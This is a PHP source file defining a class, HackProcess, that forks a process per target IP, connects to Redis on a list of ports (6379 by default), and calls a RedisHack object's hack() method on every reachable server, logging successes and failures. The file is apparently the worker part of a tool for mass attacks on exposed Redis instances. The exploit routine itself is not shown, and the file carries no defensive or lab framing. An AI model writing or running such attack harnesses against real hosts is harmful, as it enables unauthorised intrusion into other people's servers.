<?php
/**
 * Created by PhpStorm.
 * User: Jenner
 * Date: 2016/5/24
 * Time: 13:07
 */

namespace Vincent\Mice\Redis;


use Dotenv\Dotenv;
use Jenner\SimpleFork\Process;

class HackProcess extends Process
{
    protected $ip;
    protected $port;
    public function __construct($ip, $port = array(6379))
    {
        parent::__construct();
        $this->ip = $ip;
        $this->port = $port;
    }

    public function run() {
        $redis_hack = new \Vincent\Mice\Redis\RedisHack();
        foreach($this->port as $port) {
            try{
                $result = $redis_hack->connect($this->ip, $port);
                if($result !== false) {
                    $redis_hack->hack();
                    echo "success: ", $this->ip, ". port:", $port , PHP_EOL;
                }

            }catch(\Exception $e) {
                echo "failed: ", $this->ip, ". port:", $port, ". message:", $e->getMessage(), PHP_EOL;
            }
        }
    }
}